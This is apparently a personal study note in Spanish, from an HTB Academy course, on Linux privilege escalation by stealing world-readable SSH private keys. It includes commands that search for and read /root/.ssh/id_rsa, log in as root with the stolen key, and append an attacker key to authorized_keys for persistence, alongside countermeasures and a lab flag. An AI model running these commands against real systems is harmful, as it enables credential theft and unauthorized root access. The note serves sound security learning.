---
tags:
  - tecnica
  - categoria/privilege-escalation
  - categoria/credential-access
  - os/linux
  - nivel/basico
fecha_aprendida: 2026-10-02
fuente: HTB-Academy/Getting-Started
mitre_technique: T1552.004
---
# ⚔️ SSH Key Pillaging & Permissive Permissions

> [!abstract] Resumen
> Extracción y reutilización de claves privadas SSH (`id_rsa`) expuestas en el sistema de archivos debido a permisos débiles en `/root/` o `/home/*/.ssh/`. Permite obtener acceso interactivo directo como el usuario propietario de la clave (típicamente `root`) sin necesidad de conocer su contraseña ni abusar de binarios con SUID o sudo.

---

## ¿Qué es y por qué funciona?

En Linux, la autenticación SSH mediante par de claves pública/privada asume que la clave privada (`id_rsa`) solo es legible por su legítimo propietario (`chmod 600`). Sin embargo, errores de administración, respaldos descuidados o scripts de aprovisionamiento automáticos pueden dejar:
1. El directorio home (`/root` o `/home/<user>`) con permisos de ejecución/lectura para otros usuarios (`chmod 755` o `775`).
2. El archivo de clave privada `.ssh/id_rsa` con permisos de lectura globales (`chmod 644` o `-rw-r--r--`).

Cuando esto ocurre, cualquier usuario de bajo privilegio puede leer la clave privada completa. Con ella, el atacante puede:
- Autenticarse de forma legítima como ese usuario mediante SSH (`ssh -i id_rsa user@host`).
- Si además se cuenta con permisos de **escritura** sobre `.ssh/`, se puede generar un nuevo par de llaves propio (`ssh-keygen`) y añadir la clave pública a `authorized_keys` para persistencia o acceso inicial.

### El problema de OpenSSH moderno (`ssh-rsa` deprecado)
En distribuciones modernas (ej. Kali Linux reciente), el cliente OpenSSH desactiva por defecto el algoritmo de firma `ssh-rsa` (basado en SHA-1). Si la clave extraída es una RSA antigua (reconocible por el encabezado `AAAAB3NzaC1yc2E`), OpenSSH fallará silenciosamente la negociación de la clave y hará *fallback* solicitando contraseña. Esto se soluciona forzando el tipo de clave aceptada con `-o PubkeyAcceptedKeyTypes=+ssh-rsa`.

---

## Condiciones necesarias para que aplique

> [!warning] Requisitos
> - **Permisos de lectura:** El usuario actual puede atravesar (`+x`) el directorio `.ssh` y leer (`+r`) el archivo de clave privada (`id_rsa`, `id_ecdsa`, `id_ed25519`).
> - **Servicio SSH activo:** El puerto SSH (22 u otro puerto alternativo) debe estar accesible en local (`127.0.0.1`) o desde la red atacante.
> - **Configuración sshd permisiva:** `PubkeyAuthentication yes` y, en caso de la clave de root, `PermitRootLogin` habilitado (`yes` o `prohibit-password`).

---

## Procedimiento

### Detección / Enumeración

```bash
# 1. Comprobar permisos en /root y /home
ls -la /root /root/.ssh 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null

# 2. Búsqueda exhaustiva de claves privadas en el sistema de archivos
find / -name "id_rsa*" -o -name "id_ed25519*" 2>/dev/null
grep -rn "BEGIN OPENSSH PRIVATE KEY" / 2>/dev/null
```

### Explotación (Extracción y Conexión)

```bash
# Paso 1: Leer la clave completa (incluyendo cabecera y pie)
cat /root/.ssh/id_rsa

# Tip Tmux: Si estás en terminal dividida, usa 'Prefix + z' para maximizar 
# el panel y evitar copiar texto cruzado entre paneles.

# Paso 2: Guardar en la máquina atacante
nano id_rsa          # pegar el bloque completo
chmod 600 id_rsa     # OBLIGATORIO: OpenSSH rechaza claves con permisos laxos

# Paso 3: Conectar especificando la clave y forzando algoritmo si es RSA antigua
ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i id_rsa root@<IP> -p <PUERTO>

# Alternativa: Conexión local en la misma máquina si SSH no está expuesto externamente
ssh -i /root/.ssh/id_rsa root@127.0.0.1
```

### Alternativa: Escritura en `authorized_keys` (Persistencia / Acceso)

```bash
# Si se tiene permisos de ESCRITURA en /root/.ssh/:
# En la máquina atacante generar par:
ssh-keygen -f mi_clave -N ""
# En la máquina víctima agregar la pública:
echo "ssh-ed25519 AAAAC3N... atacante@kali" >> /root/.ssh/authorized_keys
# Conectar:
ssh -i mi_clave root@<IP> -p <PUERTO>
```

---

## Herramientas asociadas

| Herramienta | Función | Comando base |
| ----------- | ------- | ------------ |
| OpenSSH Client | Conexión remota usando identidad privada | `ssh -i id_rsa user@ip` |
| `chmod` | Ajustar permisos mínimos para que SSH acepte la clave privada | `chmod 600 id_rsa` |
| `ssh-keygen` | Generar pares de claves para inyección en `authorized_keys` | `ssh-keygen -f clave` |

---

## Contramedidas (defensa)

> [!info] ¿Cómo se previene?
> 1. **Permisos estrictos de archivos:** El directorio `.ssh` debe tener permisos `700` (`drwx------`) y las claves privadas `600` (`-rw-------`). Los directorios home de los usuarios no deben tener permisos de lectura ni ejecución para el grupo/otros (`chmod 700 /root`).
> 2. **Deshabilitar login directo de root:** En `/etc/ssh/sshd_config`, configurar `PermitRootLogin no`.
> 3. **Auditoría de configuración:** Validar periódicamente que no existan claves privadas con permisos globales (`find / -perm -o=r -name "id_*" -exec chmod 600 {} \;`).

---

## Dónde la usé

- HTB Academy — Getting Started, Sección 11 (Escalada de Privilegios) — Lectura de `/root/.ssh/id_rsa` desde `user2` debido a permisos globales en `/root/` y `/root/.ssh/id_rsa` (`644`). Conexión SSH como root (flag: `HTB{pr1v1l363_35c4l4710n_2_r007}`).

---

## Referencias

- [MITRE ATT&CK - T1552.004 (Unsecured Credentials: Private Keys)](https://attack.mitre.org/techniques/T1552/004/)
- [OpenSSH Security Advisory - Legacy RSA Deprecation](https://www.openssh.com/txt/release-8.8)
- [HackTricks - Linux Privilege Escalation (SSH Keys)](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ssh-keys)
